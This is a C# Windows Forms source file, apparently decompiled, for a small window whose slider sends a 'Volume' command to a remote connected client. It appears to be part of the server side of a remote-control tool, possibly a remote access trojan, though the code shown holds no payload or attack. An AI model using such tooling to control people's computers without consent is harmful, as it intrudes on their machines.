using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormVolumeControl : FormMaterial
{
	public Clients client;

	public Clients parrent;

	private IContainer components;

	private Timer timer1;

	private Panel panel1;

	public MaterialSlider materialSlider1;

	public FormVolumeControl()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	private void FormProcess_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		timer1.Start();
	}

	private void ChangeScheme(object sender)
	{
		Color back = (BackColor = ((MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK) ? Color.FromArgb(40, 40, 40) : Color.White));
		if (panel1 != null)
		{
			panel1.BackColor = back;
		}
		if (materialSlider1 != null)
		{
			materialSlider1.BackColor = back;
		}
	}

	private void Closing1(object sender, EventArgs e)
	{
		if (client != null)
		{
			client.Disconnect();
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (!parrent.itsConnect)
		{
			Close();
		}
		if (client != null && !client.itsConnect)
		{
			Close();
		}
	}

	private void materialSlider1_MouseUp(object sender, MouseEventArgs e)
	{
		client.Send(new object[2] { "Volume", materialSlider1.Value });
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.panel1 = new System.Windows.Forms.Panel();
		this.materialSlider1 = new MaterialSkin.Controls.MaterialSlider();
		this.panel1.SuspendLayout();
		base.SuspendLayout();
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.panel1.Controls.Add(this.materialSlider1);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panel1.Location = new System.Drawing.Point(3, 64);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(456, 70);
		this.panel1.TabIndex = 0;
		this.materialSlider1.Depth = 0;
		this.materialSlider1.ForeColor = System.Drawing.Color.FromArgb(222, 0, 0, 0);
		this.materialSlider1.Location = new System.Drawing.Point(3, 13);
		this.materialSlider1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSlider1.Name = "materialSlider1";
		this.materialSlider1.Size = new System.Drawing.Size(450, 40);
		this.materialSlider1.TabIndex = 0;
		this.materialSlider1.Text = "";
		this.materialSlider1.MouseUp += new System.Windows.Forms.MouseEventHandler(materialSlider1_MouseUp);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(462, 137);
		base.Controls.Add(this.panel1);
		base.Name = "FormVolumeControl";
		this.Text = "Volume ";
		base.Load += new System.EventHandler(FormProcess_Load);
		this.panel1.ResumeLayout(false);
		base.ResumeLayout(false);
	}
}
